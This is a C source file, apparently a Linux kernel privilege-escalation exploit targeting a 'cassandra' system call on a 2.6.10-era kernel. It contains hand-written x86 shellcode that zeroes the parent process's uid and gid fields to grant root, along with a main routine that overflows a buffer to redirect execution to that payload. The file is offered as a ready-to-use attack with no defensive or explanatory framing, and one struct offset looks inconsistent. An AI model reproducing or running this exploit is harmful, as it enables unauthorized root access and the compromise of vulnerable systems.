/* cassandra_exploit.c */

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdio.h>
#include <errno.h>
#include <linux/cassandra.h>
#include "/usr/src/linux-2.6.10/include/asm/unistd.h"
#include  <linux/sysctl.h>

#define NOP 'A'

char payload[]=
"\x90\x90\x90"

/* get current process */
"\x31\xf6"                //      xor    %esi,%esi
"\xb8\x00\xe0\xff\xff"    //      mov    $0xffffe000,%eax
"\x21\xe0"  		  //	  andl   %esp, %eax
"\x8b\x00"		  // 	  mov    (%eax),%eax

/* capture the parent */
"\x8b\x80\xb0\x00\x00\x00"       // mov    0xb0(%eax),%eax

/* set uid to 0 */

"\xc7\x80\x98\x01\x00\x00\x00"   // movl $0x0,0x198(%eax)
"\x00\x00\x00"

"\xc7\x80\x9b\x01\x00\x00\x00"  // movl $0x0,0x19b(%eax)
"\x00\x00\x00"

"\xc7\x80\xa0\x01\x00\x00\x00" // movl $0x0,0x1a0(%eax)
"\x00\x00\x00"

"\xc7\x80\xa4\x01\x00\x00\x00" // movl $0x0,0x1a4(%eax)
"\x00\x00\x00"

/* set gid to 0 */

"\xc7\x80\xa8\x01\x00\x00\x00"
"\x00\x00\x00"

"\xc7\x80\xac\x01\x00\x00\x00"
"\x00\x00\x00"

"\xc7\x80\xb0\x01\x00\x00\x00"
"\x00\x00\x00"

"\xc7\x80\xb4\x01\x00\x00\x00"
"\x00\x00\x00"

/* exit(0) */

"\x31\xc0"                 //      xor    %eax,%eax
"\x40"                     //      inc    %eax
"\xcd\x80";               //      int    $0x80


int main(int argc,char *argv[]){
char code[1024];
unsigned int len;


memset(code,NOP,1024);
memcpy(code,payload,sizeof(payload));

len = 256+8+4+4;

printf("payload addr is:%p\n",&payload);
*(int *)(code+256+8+4) = (int)&payload;
cassandra(len,code);
return 0;
}
